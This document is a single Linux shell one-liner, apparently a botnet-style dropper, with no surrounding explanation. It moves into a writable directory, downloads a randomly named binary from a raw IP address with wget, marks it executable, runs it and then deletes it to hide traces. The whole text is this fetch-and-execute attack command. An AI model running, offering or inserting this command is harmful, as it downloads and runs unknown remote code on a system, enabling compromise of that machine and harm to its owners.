cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.98.118.72/psikdbvsiobdvodvbdsbv; chmod +x psikdbvsiobdvodvbdsbv; ./psikdbvsiobdvodvbdsbv; rm -rf psikdbvsiobdvodvbdsbv
